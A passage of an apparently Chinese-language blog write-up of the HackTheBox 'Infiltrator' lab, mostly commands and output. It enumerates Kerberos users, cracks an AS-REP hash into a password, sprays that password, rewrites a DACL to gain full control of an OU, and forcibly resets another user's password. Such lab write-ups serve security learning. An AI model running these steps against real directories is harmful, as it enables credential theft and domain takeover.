class="line">k_turner@infiltrator.htb</span><br><span class="line">amanda.walker@infiltrator.htb</span><br><span class="line">amanda_walker@infiltrator.htb</span><br><span class="line">a.walker@infiltrator.htb</span><br><span class="line">a_walker@infiltrator.htb</span><br><span class="line">marcus.harris@infiltrator.htb</span><br><span class="line">marcus_harris@infiltrator.htb</span><br><span class="line">m.harris@infiltrator.htb</span><br><span class="line">m_harris@infiltrator.htb</span><br><span class="line">lauren.clark@infiltrator.htb</span><br><span class="line">lauren_clark@infiltrator.htb</span><br><span class="line">l.clark@infiltrator.htb</span><br><span class="line">l_clark@infiltrator.htb</span><br><span class="line">ethan.rodriguez@infiltrator.htb</span><br><span class="line">ethan_rodriguez@infiltrator.htb</span><br><span class="line">e.rodriguez@infiltrator.htb</span><br><span class="line">e_rodriguez@infiltrator.htb</span><br></pre></td></tr></table></figure>
<p>这里用  <a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute">ropnop&#x2F;kerbrute: A tool to perform Kerberos pre-auth bruteforcing (github.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go install -v github.com/ropnop/kerbrute@latest</span><br></pre></td></tr></table></figure>

<p>这里我配置了dns服务器，所以非常舒适,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">└─$ kerbrute userenum -d infiltrator.htb AD_username </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (n/a) - 09/05/24 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2024/09/05 22:23:05 &gt;  Using KDC(s):</span><br><span class="line">2024/09/05 22:23:05 &gt;   dc01.infiltrator.htb:88</span><br><span class="line"></span><br><span class="line">2024/09/05 22:23:06 &gt;  [+] VALID USERNAME:       o.martinez@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:06 &gt;  [+] VALID USERNAME:       d.anderson@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:09 &gt;  [+] VALID USERNAME:       k.turner@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:09 &gt;  [+] VALID USERNAME:       a.walker@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:10 &gt;  [+] VALID USERNAME:       m.harris@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:10 &gt;  [+] VALID USERNAME:       e.rodriguez@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:13 &gt;  [+] VALID USERNAME:       l.clark@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:13 &gt;  Done! Tested 28 usernames (7 valid) in 8.431 seconds</span><br></pre></td></tr></table></figure>
<p>如果没有配置dns服务器<br>需要加上–dc dc01.infiltrator.htb<br>命令就要改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum -d infiltrator.htb AD_username --dc dc01.infiltrator.htb</span><br></pre></td></tr></table></figure>

<p>将下列内容写入tmp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2024/09/05 22:23:06 &gt;  [+] VALID USERNAME:       o.martinez@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:06 &gt;  [+] VALID USERNAME:       d.anderson@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:09 &gt;  [+] VALID USERNAME:       k.turner@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:09 &gt;  [+] VALID USERNAME:       a.walker@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:10 &gt;  [+] VALID USERNAME:       m.harris@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:10 &gt;  [+] VALID USERNAME:       e.rodriguez@infiltrator.htb</span><br><span class="line">2024/09/05 22:23:13 &gt;  [+] VALID USERNAME:       l.clark@infiltrator.htb</span><br></pre></td></tr></table></figure>
<p>再次用awk进行切分，获得真正的用户名列表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat tmp |awk  -F&#x27; &#x27; &#x27;&#123;print $7&#125;&#x27;</span><br><span class="line">o.martinez@infiltrator.htb</span><br><span class="line">d.anderson@infiltrator.htb</span><br><span class="line">k.turner@infiltrator.htb</span><br><span class="line">a.walker@infiltrator.htb</span><br><span class="line">m.harris@infiltrator.htb</span><br><span class="line">e.rodriguez@infiltrator.htb</span><br><span class="line">l.clark@infiltrator.htb</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat tmp |awk  -F&#x27; &#x27; &#x27;&#123;print $7&#125;&#x27; &gt; AD_usr</span><br></pre></td></tr></table></figure>


<h2 id="GetNPUsers"><a href="#GetNPUsers" class="headerlink" title="GetNPUsers"></a>GetNPUsers</h2><p>现在该整点HASH了</p>
<p>用impacket，如果是kali，是预装的，如果和我一样用了pyenv，而且还喜欢用global 导致系统原有的python被覆盖了。那么可以在<code>~/.zshrc</code><br>里加上<code>rm /home/kali/.pyenv/shims/python3</code><br>注意<code>/home/kali</code>是你的用户的home，不要照抄，除非你也是kali<br>这样可以避免影响系统的很多工具，而且可以快乐的用自己pyenv里的python，以免”整活”失败需要重新配环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-GetNPUsers infiltrator.htb/ -usersfile AD_usr -outputfile outputusers.txt  -no-pass </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] User o.martinez@infiltrator.htb doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User d.anderson@infiltrator.htb doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User k.turner@infiltrator.htb doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User a.walker@infiltrator.htb doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User m.harris@infiltrator.htb doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User e.rodriguez@infiltrator.htb doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">$krb5asrep$23$l.clark@infiltrator.htb@INFILTRATOR.HTB:52c941038bffe158a729e721a83eca5c$2478d99303d3d9edfd1cbadb41a6463a2df4a97acdf4da4e2c185394c651e78019bb401643cd1c86cd20f9edc5b81025b12fcc553aaa2db741eee0ce7d0a2b86b6ef1a71bf90fb31d7d4cd5d7a6fb44a89cd64613d263e59d00910d52924d2dfb21a0c6db95e996cb51806865d536252484a78a81238161462bb029cdf37c0181e85f038578216f4653351edfb24c46e10faafe0536a539e7a2c52ffccd5503031c177e0564b1b431bc7e02cc1424628dd238503c0a1f58e5398dfb9d9985307f650f52f1165317a20617a2bb4aa2872113f6f3ceb218e226d97551dd599c3cff76e5b47bdfa6d8517f92733073d702951b4</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果没配DNS，记得加上<code>-dc-ip dc01.infiltrator.htb</code></p>
<p>也就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetNPUsers infiltrator.htb/ -usersfile AD_usr -outputfile outputusers.txt  -no-pass  -dc-ip dc01.infiltrator.htb</span><br></pre></td></tr></table></figure>

<p>然后将获取的这一串hash写入到文件里，等会用hashcat进行爆破<br>这里可以看到是 <a href="mailto:&#x6c;&#x2e;&#x63;&#x6c;&#x61;&#x72;&#x6b;&#64;&#105;&#x6e;&#x66;&#x69;&#x6c;&#116;&#x72;&#x61;&#x74;&#x6f;&#x72;&#46;&#x68;&#x74;&#x62;">&#x6c;&#x2e;&#x63;&#x6c;&#x61;&#x72;&#x6b;&#64;&#105;&#x6e;&#x66;&#x69;&#x6c;&#116;&#x72;&#x61;&#x74;&#x6f;&#x72;&#46;&#x68;&#x74;&#x62;</a> 用户的hash，就直接用它命名</p>
<h2 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h2><p>可以直接用hashcat来识别hash类型，然后在用-m 指定类型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ hashcat l.clark@infiltrator.htb_hash </span><br><span class="line">hashcat (v6.2.6) starting in autodetect mode</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">==================================================================================================================================================</span><br><span class="line">* Device #1: cpu-haswell-AMD Ryzen 7 4800U with Radeon Graphics, 1439/2942 MB (512 MB allocatable), 8MCU</span><br><span class="line"></span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input hash:</span><br><span class="line"></span><br><span class="line">18200 | Kerberos 5, etype 23, AS-REP | Network Protocol</span><br><span class="line"></span><br><span class="line">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里可以看到他直接识别出来了  <code>18200 | Kerberos 5, etype 23, AS-REP | Network Protocol</code><br>后面就可以   <code>-m 18200</code></p>
<p>然后用上rockyou，冲就完事</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat l.clark@infiltrator.htb_hash -a 0 -m 18200 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>谈笑间，秒了，使用 <code>--show</code>来查看结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat l.clark@infiltrator.htb_hash -a 0 -m 18200 /usr/share/wordlists/rockyou.txt --show</span><br><span class="line">$krb5asrep$23$l.clark@infiltrator.htb@INFILTRATOR.HTB:1877dab6354c43532e0888a464b5b166$1a5e7f261487819c2413695ebffd0d8d7237199d320d65523e864df65becf802953e64eb7203da62766c6d06e97aba69faa81752444745b8e115ee538295dbe58b935df7a5ace5731811932504c6dd57dd2175d4519a7cf4099a9e883dcf8cf9c7bb1097fa65c05ab463350cc144a0cb181f240002153e2e6950b3d9c38ad7b5187a1de9430a0014ea457c9fcc88cd0715f14b436ebfd13daec3764611a4e1e4df4923b9966272b5881589b38f6ca58a53cb7f5f4fc5eb040132e659fa6cd3bd8af53789fc9fcf5d59d793721786c6f0f7176da6fb25a1fda116ab806b1328762bf874b58493948b1ecc4d682bc336f451a2:WAT?watismypass!</span><br></pre></td></tr></table></figure>

<p>有趣有趣，这就有了一组凭据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l.clark@infiltrator.htb:WAT?watismypass!</span><br></pre></td></tr></table></figure>


<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><p>psexec试下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-psexec infiltrator.htb/l.clark:WAT?watismypass\!@dc01.infiltrator.htb </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on dc01.infiltrator.htb.....</span><br><span class="line">[-] share &#x27;ADMIN$&#x27; is not writable.</span><br><span class="line">[-] share &#x27;C$&#x27; is not writable.</span><br><span class="line">[-] share &#x27;NETLOGON&#x27; is not writable.</span><br><span class="line">[-] share &#x27;SYSVOL&#x27; is not writable.</span><br></pre></td></tr></table></figure>
<p>Oh no~，我的权限不够</p>
<p><strong>psexec的前置条件</strong></p>
<ol>
<li>445端口开放</li>
<li>有可写入的共享目录</li>
</ol>
<p>其他的类似工具还有smbexec、atexec、 wmiexec、dcomexec<br>鉴于没有可写目录，那么就换atexec试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">─$ impacket-atexec infiltrator.htb/l.clark:WAT?watismypass\!@dc01.infiltrator.htb cmd </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[!] This will work ONLY on Windows &gt;= Vista</span><br><span class="line">[*] Creating task \wPBwKvid</span><br><span class="line">[-] rpc_s_access_denied</span><br></pre></td></tr></table></figure>
<p>再换wmiexec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-wmiexec infiltrator.htb/l.clark:WAT?watismypass\!@dc01.infiltrator.htb cmd</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] SMBv3.0 dialect used</span><br><span class="line">[-] WMI Session Error: code: 0x80041003 - WBEM_E_ACCESS_DENIED</span><br></pre></td></tr></table></figure>
<p>最后试下dcomexec，不行就得考虑别的思路了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-dcomexec infiltrator.htb/l.clark:WAT?watismypass\!@dc01.infiltrator.htb cmd</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] SMBv3.0 dialect used</span><br><span class="line">[-] DCOM SessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br></pre></td></tr></table></figure>
<p>这就换、这就换<br>先做个字典newuser</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat AD_usr| awk -F &#x27;@&#x27; &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line">o.martinez</span><br><span class="line">d.anderson</span><br><span class="line">k.turner</span><br><span class="line">a.walker</span><br><span class="line">m.harris</span><br><span class="line">e.rodriguez</span><br><span class="line">l.clark</span><br><span class="line">└─$ cat AD_usr| awk -F &#x27;@&#x27; &#x27;&#123;print $1&#125;&#x27; &gt;newuser</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="密码喷射"><a href="#密码喷射" class="headerlink" title="密码喷射"></a>密码喷射</h2><p>确实只有这一个人用这个密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ crackmapexec smb 10.10.11.31  -u newuser -p pass</span><br><span class="line">SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\o.martinez:WAT?watismypass! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\d.anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION </span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\k.turner:WAT?watismypass! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\a.walker:WAT?watismypass! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\m.harris:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION </span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\e.rodriguez:WAT?watismypass! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">infiltrator.htb\d.anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION </span><br><span class="line">infiltrator.htb\m.harris:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION</span><br></pre></td></tr></table></figure>
<p>d.anderson和m.harris有点异常，会不会这个密码可以复用</p>
<h2 id="getTGT"><a href="#getTGT" class="headerlink" title="getTGT"></a>getTGT</h2><p>很神奇，这密码d.anderson他真的在用</p>
<p>用新加坡的节点就报这个错<br><strong>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</strong><br>用美国节点就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-getTGT infiltrator.htb/d.anderson:&#x27;WAT?watismypass!&#x27; -dc-ip dc01.infiltrator.htb</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Saving ticket in d.anderson.ccache</span><br></pre></td></tr></table></figure>


<h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><p>使用python采集器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d infiltrator.htb -u l.clark -p &quot;WAT?watismypass\!&quot; -c all  --dns-tcp --zip</span><br></pre></td></tr></table></figure>

<p>确实可以搜集，但<code>l.clark</code>确实没啥用<br><code>d.anderson</code>跑一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">└─$ bloodhound-python -d infiltrator.htb -u d.anderson -p &#x27;WAT?watismypass!&#x27; -c all -ns 10.10.11.31 --zip </span><br><span class="line">INFO: Found AD domain: infiltrator.htb</span><br><span class="line">INFO: Getting TGT for user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.infiltrator.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc01.infiltrator.htb</span><br><span class="line">INFO: Found 14 users</span><br><span class="line">INFO: Found 58 groups</span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 2 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc01.infiltrator.htb</span><br><span class="line">INFO: Done in 01M 03S</span><br><span class="line">INFO: Compressing output into 20240906085109_bloodhound.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>d.anderson</code>真的有用<br>重新导入这个数据时记得清空session和database免得出现奇奇怪怪的错误<br><img src="https://gcore.jsdelivr.net/gh/bilibiliganb/mypic/img20240906215945.png"><br>有一条完整的攻击链</p>
<h3 id="68-x2e-x41-78-68-69-x52-x53-79-x4e-x40-73-78-70-73-76-x54-x52-x41-x54-x4f-x52-x2e-72-x54-x42-—GenericAll—-MARKETING-68-x49-x47-73-84-65-x4c-64-x49-x4e-70-x49-76-x54-x52-x41-x54-79-82-46-72-84-66"><a href="#68-x2e-x41-78-68-69-x52-x53-79-x4e-x40-73-78-70-73-76-x54-x52-x41-x54-x4f-x52-x2e-72-x54-x42-—GenericAll—-MARKETING-68-x49-x47-73-84-65-x4c-64-x49-x4e-70-x49-76-x54-x52-x41-x54-79-82-46-72-84-66" class="headerlink" title="&#68;&#x2e;&#x41;&#78;&#68;&#69;&#x52;&#x53;&#79;&#x4e;&#x40;&#73;&#78;&#70;&#73;&#76;&#x54;&#x52;&#x41;&#x54;&#x4f;&#x52;&#x2e;&#72;&#x54;&#x42; —GenericAll—&gt;MARKETING &#68;&#x49;&#x47;&#73;&#84;&#65;&#x4c;&#64;&#x49;&#x4e;&#70;&#x49;&#76;&#x54;&#x52;&#x41;&#x54;&#79;&#82;&#46;&#72;&#84;&#66;"></a><a href="mailto:&#68;&#x2e;&#x41;&#78;&#68;&#69;&#x52;&#x53;&#79;&#x4e;&#x40;&#73;&#78;&#70;&#73;&#76;&#x54;&#x52;&#x41;&#x54;&#x4f;&#x52;&#x2e;&#72;&#x54;&#x42;">&#68;&#x2e;&#x41;&#78;&#68;&#69;&#x52;&#x53;&#79;&#x4e;&#x40;&#73;&#78;&#70;&#73;&#76;&#x54;&#x52;&#x41;&#x54;&#x4f;&#x52;&#x2e;&#72;&#x54;&#x42;</a> —GenericAll—&gt;MARKETING <a href="mailto:&#68;&#x49;&#x47;&#73;&#84;&#65;&#x4c;&#64;&#x49;&#x4e;&#70;&#x49;&#76;&#x54;&#x52;&#x41;&#x54;&#79;&#82;&#46;&#72;&#84;&#66;">&#68;&#x49;&#x47;&#73;&#84;&#65;&#x4c;&#64;&#x49;&#x4e;&#70;&#x49;&#76;&#x54;&#x52;&#x41;&#x54;&#79;&#82;&#46;&#72;&#84;&#66;</a></h3><p>看看说明书<br><img src="https://gcore.jsdelivr.net/gh/bilibiliganb/mypic/img20240906220204.png"><br>看下面的解释<br>这也称为完全控制。此权限允许受托人以任何他们想要的方式操纵目标对象。<br>那么首先就修改ACL让我现在的d.anderson用户获得OU&#x3D;MARKETING DIGITAL的FullControl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ export KRB5CCNAME=d.anderson.ccache</span><br><span class="line"></span><br><span class="line">└─$ dacledit.py -action &#x27;write&#x27; -rights &#x27;FullControl&#x27; -inheritance -principal &#x27;d.anderson&#x27; -target-dn &#x27;OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB&#x27; &#x27;infiltrator.htb/d.anderson&#x27; -k -no-pass -dc-ip dc01.infiltrator.htb</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU</span><br><span class="line">[*] DACL backed up to dacledit-20240906-093926.bak</span><br><span class="line">[*] DACL modified successfully!</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="MARKETING-x44-73-71-73-84-x41-x4c-x40-73-x4e-x46-73-76-84-82-65-x54-79-x52-x2e-x48-84-66-—Contains—-69-x2e-x52-x4f-68-x52-x49-71-85-69-x5a-x40-x49-78-70-x49-x4c-x54-82-x41-x54-x4f-x52-x2e-x48-84-66"><a href="#MARKETING-x44-73-71-73-84-x41-x4c-x40-73-x4e-x46-73-76-84-82-65-x54-79-x52-x2e-x48-84-66-—Contains—-69-x2e-x52-x4f-68-x52-x49-71-85-69-x5a-x40-x49-78-70-x49-x4c-x54-82-x41-x54-x4f-x52-x2e-x48-84-66" class="headerlink" title="MARKETING &#x44;&#73;&#71;&#73;&#84;&#x41;&#x4c;&#x40;&#73;&#x4e;&#x46;&#73;&#76;&#84;&#82;&#65;&#x54;&#79;&#x52;&#x2e;&#x48;&#84;&#66; —Contains—&gt;&#69;&#x2e;&#x52;&#x4f;&#68;&#x52;&#x49;&#71;&#85;&#69;&#x5a;&#x40;&#x49;&#78;&#70;&#x49;&#x4c;&#x54;&#82;&#x41;&#x54;&#x4f;&#x52;&#x2e;&#x48;&#84;&#66;"></a>MARKETING <a href="mailto:&#x44;&#73;&#71;&#73;&#84;&#x41;&#x4c;&#x40;&#73;&#x4e;&#x46;&#73;&#76;&#84;&#82;&#65;&#x54;&#79;&#x52;&#x2e;&#x48;&#84;&#66;">&#x44;&#73;&#71;&#73;&#84;&#x41;&#x4c;&#x40;&#73;&#x4e;&#x46;&#73;&#76;&#84;&#82;&#65;&#x54;&#79;&#x52;&#x2e;&#x48;&#84;&#66;</a> —Contains—&gt;<a href="mailto:&#69;&#x2e;&#x52;&#x4f;&#68;&#x52;&#x49;&#71;&#85;&#69;&#x5a;&#x40;&#x49;&#78;&#70;&#x49;&#x4c;&#x54;&#82;&#x41;&#x54;&#x4f;&#x52;&#x2e;&#x48;&#84;&#66;">&#69;&#x2e;&#x52;&#x4f;&#68;&#x52;&#x49;&#71;&#85;&#69;&#x5a;&#x40;&#x49;&#78;&#70;&#x49;&#x4c;&#x54;&#82;&#x41;&#x54;&#x4f;&#x52;&#x2e;&#x48;&#84;&#66;</a></h3><p>我都可以完全控制”MARKETING <a href="mailto:&#68;&#73;&#71;&#x49;&#84;&#65;&#76;&#x40;&#x49;&#78;&#70;&#x49;&#76;&#84;&#82;&#x41;&#x54;&#79;&#82;&#46;&#72;&#84;&#66;">&#68;&#73;&#71;&#x49;&#84;&#65;&#76;&#x40;&#x49;&#78;&#70;&#x49;&#76;&#84;&#82;&#x41;&#x54;&#79;&#82;&#46;&#72;&#84;&#66;</a> “了，既然e.rodriguez在这个组，那就改它的密码，这样就可以使用它</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /opt/AD_tools/bloodyAD/bloodyAD.py --host &quot;dc01.infiltrator.htb&quot; -d &quot;infiltrator.htb&quot; --kerberos --dc-ip 10.10.11.31 -u &quot;d.anderson&quot; -p &quot;WAT?watismypass\!&quot; set password &quot;e.rodriguez&quot; &quot;QWEasd123@123&quot; </span><br></pre></td></tr></table></figure>
<p><img src="https://gcore.jsdelivr.net/gh/bilibiliganb/mypic/img20240906221253.png"></p>
<p>可以看到要快点执行，不然就因为那个什么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password can&#x27;t be changed before -2 days, 23:55:48.953082 because of the minimum password age policy.</span><br></pre></td></tr></table></figure>
<p>神奇的错误不让我改密码</p>
